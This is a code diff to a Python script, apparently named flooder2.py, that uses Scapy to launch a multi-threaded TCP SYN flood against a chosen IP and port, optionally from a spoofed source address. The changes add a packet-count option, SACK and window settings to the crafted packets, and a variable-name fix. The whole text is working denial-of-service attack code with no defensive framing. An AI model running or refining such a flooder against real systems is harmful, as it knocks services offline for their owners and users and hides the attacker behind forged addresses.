@@ -11,6 +11,7 @@ def usage():
 	print("-d --destination             - Ip of destination")
 	print("-p --port                    - Port of destination")
 	print("-s --source                  - Source ip address")
+	print("-c --count					- Number of packets to send")
 	print("")
 	print("Example: ./flooder2.py -t 500 -d 10.1.5.2 -p 80 -s 10.1.2.2")
 	sys.exit(0)
@@ -25,18 +26,20 @@ class Flooder(Thread):
 		dest_port = 80
 		src_port = random.randint(1025, 65535)
 		sequence = random.randint(1000,100000)
-		opt = [("MSS", 65495), ('Timestamp', (4294693388, 0)), ("NOP", None), ("WScale",6)]
-		windos = 65495
+		opt = [("MSS", 65495), ("SAckOK", b''), ('Timestamp', (4294693388, 0)),  ("NOP", None), ("WScale",10)]
+		window = 65495
 		ip = IP(src=self.ip, dst=self.target)
-		tcp = TCP(sport=src_port, dport=dest_port, flags="S", seq=sequence, options=opt)
+		tcp = TCP(sport=src_port, dport=dest_port, flags="S", window=window, seq=sequence, options=opt)
 		packet = ip/tcp
 
 		return packet
 
 	def run(self):
 		packet = self.build_packet()
+		
 		try:
 			send(packet, verbose=False)
+			#send(packet,verbose=False)
 		except KeyboardInterrupt:
 			print("Operation interrupted by user...")
 			sys.exit(0)
@@ -64,7 +67,7 @@ def main():
 	target = args.destination
 	target_port = int(args.port)
 	ip = args.source
-
+	
 	threads=[]
 	print('[*] Started SYN Flood on: {}'.format(target))
 	while True:
